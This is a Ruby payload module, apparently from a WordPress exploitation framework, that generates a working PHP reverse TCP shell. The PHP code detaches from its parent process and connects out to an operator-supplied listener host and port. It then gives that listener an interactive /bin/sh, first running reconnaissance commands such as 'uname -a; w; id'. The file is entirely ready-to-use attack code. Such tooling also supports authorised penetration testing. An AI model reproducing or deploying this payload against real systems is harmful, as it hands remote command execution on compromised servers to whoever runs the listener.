module Wpxf::Payloads
  # A basic reverse TCP shell written in PHP.
  class ReverseTcp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'shell',
          required: true,
          default: 'uname -a; w; id; /bin/sh -i',
          desc: 'Shell command to run'
        ),
        StringOption.new(
          name: 'lhost',
          required: true,
          default: '',
          desc: 'The address of the host listening for a connection'
        ),
        PortOption.new(
          name: 'lport',
          required: true,
          default: 1234,
          desc: 'The port being used to listen for incoming connections'
        ),
        IntegerOption.new(
          name: 'chunk_size',
          required: true,
          default: 1400,
          desc: 'TCP chunk size'
        )
      ])
    end

    def shell
      escape_single_quotes(datastore['shell'])
    end

    def host
      escape_single_quotes(datastore['lhost'])
    end

    def generate_php_vars
      generate_vars([
        :ip, :port, :chunk_size, :write_a, :error_a, :shell, :pid, :sock,
        :errno, :shell, :pid, :sock, :errno, :errstr, :descriptor_spec,
        :process, :pipes, :read_a, :error_a, :num_changed_sockets, :input
      ])
    end

    def encoded
      php_vars = generate_php_vars
      <<-END_OF_PHP_CODE
      <?php
        set_time_limit (0);
        $#{php_vars[:ip]} = '#{host}';
        $#{php_vars[:port]} = #{datastore['lport']};
        $#{php_vars[:chunk_size]} = #{datastore['chunk_size']};
        $#{php_vars[:write_a]} = null;
        $#{php_vars[:error_a]} = null;
        $#{php_vars[:shell]} = '#{shell}';

        if (function_exists('pcntl_fork')) {
          $#{php_vars[:pid]} = pcntl_fork();

          if ($#{php_vars[:pid]} == -1) {
            exit(1);
          }

          if ($#{php_vars[:pid]}) {
            exit(0);
          }

          if (posix_setsid() == -1) {
            exit(1);
          }
        }

        umask(0);

        $#{php_vars[:sock]} = fsockopen($#{php_vars[:ip]}, $#{php_vars[:port]}, $#{php_vars[:errno]}, $#{php_vars[:errstr]}, 30);
        if (!$#{php_vars[:sock]}) {
          exit(1);
        }

        $#{php_vars[:descriptor_spec]} = array(
           0 => array("pipe", "r"),
           1 => array("pipe", "w"),
           2 => array("pipe", "w")
        );

        $#{php_vars[:process]} = proc_open($#{php_vars[:shell]}, $#{php_vars[:descriptor_spec]}, $#{php_vars[:pipes]});

        if (!is_resource($#{php_vars[:process]})) {
          exit(1);
        }

        stream_set_blocking($#{php_vars[:pipes]}[0], 0);
        stream_set_blocking($#{php_vars[:pipes]}[1], 0);
        stream_set_blocking($#{php_vars[:pipes]}[2], 0);
        stream_set_blocking($#{php_vars[:sock]}, 0);

        while (1) {
          if (feof($#{php_vars[:sock]})) {
            break;
          }

          if (feof($#{php_vars[:pipes]}[1])) {
            break;
          }

          $#{php_vars[:read_a]} = array($#{php_vars[:sock]}, $#{php_vars[:pipes]}[1], $#{php_vars[:pipes]}[2]);
          $#{php_vars[:num_changed_sockets]} = stream_select($#{php_vars[:read_a]}, $#{php_vars[:write_a]}, $#{php_vars[:error_a]}, null);

          if (in_array($#{php_vars[:sock]}, $#{php_vars[:read_a]})) {
            $#{php_vars[:input]} = fread($#{php_vars[:sock]}, $#{php_vars[:chunk_size]});
            fwrite($#{php_vars[:pipes]}[0], $#{php_vars[:input]});
          }

          if (in_array($#{php_vars[:pipes]}[1], $#{php_vars[:read_a]})) {
            $#{php_vars[:input]} = fread($#{php_vars[:pipes]}[1], $#{php_vars[:chunk_size]});
            fwrite($#{php_vars[:sock]}, $#{php_vars[:input]});
          }

          if (in_array($#{php_vars[:pipes]}[2], $#{php_vars[:read_a]})) {
            $#{php_vars[:input]} = fread($#{php_vars[:pipes]}[2], $#{php_vars[:chunk_size]});
            fwrite($#{php_vars[:sock]}, $#{php_vars[:input]});
          }
        }

        fclose($#{php_vars[:sock]});
        fclose($#{php_vars[:pipes]}[0]);
        fclose($#{php_vars[:pipes]}[1]);
        fclose($#{php_vars[:pipes]}[2]);
        proc_close($#{php_vars[:process]});
      ?>
      END_OF_PHP_CODE
    end
  end
end
